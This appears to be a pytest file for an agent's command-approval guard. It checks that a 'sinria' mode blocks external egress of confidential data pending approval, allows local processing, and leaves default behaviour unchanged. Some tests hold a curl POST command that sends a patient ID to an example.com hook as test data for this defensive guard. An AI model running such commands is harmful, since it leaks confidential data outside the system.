import os

from tools.approval import check_all_command_guards


def test_sinria_terminal_external_command_with_confidential_payload_requires_approval(monkeypatch):
    monkeypatch.setenv("HERMES_CLI_NAME", "sinria")
    monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
    monkeypatch.delenv("HERMES_EXEC_ASK", raising=False)
    monkeypatch.delenv("HERMES_YOLO_MODE", raising=False)

    decision = check_all_command_guards(
        "curl -X POST https://example.com/hook -d 'patient id: 12345'",
        "local",
    )

    assert decision["approved"] is False
    assert decision["status"] == "approval_required"
    assert decision["pattern_key"] == "sinria_external_egress"
    assert "Sinria external egress guard" in decision["message"]


def test_sinria_terminal_allows_local_confidential_processing(monkeypatch):
    monkeypatch.setenv("HERMES_CLI_NAME", "sinria")
    monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
    monkeypatch.delenv("HERMES_EXEC_ASK", raising=False)
    monkeypatch.delenv("HERMES_YOLO_MODE", raising=False)

    decision = check_all_command_guards(
        "python3 - <<'PY'\nprint('patient id: 12345')\nPY",
        "local",
    )

    assert decision["approved"] is True


def test_hermes_terminal_external_command_behavior_is_unchanged(monkeypatch):
    monkeypatch.delenv("HERMES_CLI_NAME", raising=False)
    monkeypatch.delenv("HERMES_INTERACTIVE", raising=False)
    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
    monkeypatch.delenv("HERMES_EXEC_ASK", raising=False)
    monkeypatch.delenv("HERMES_YOLO_MODE", raising=False)

    decision = check_all_command_guards(
        "curl -X POST https://example.com/hook -d 'patient id: 12345'",
        "local",
    )

    assert decision["approved"] is True
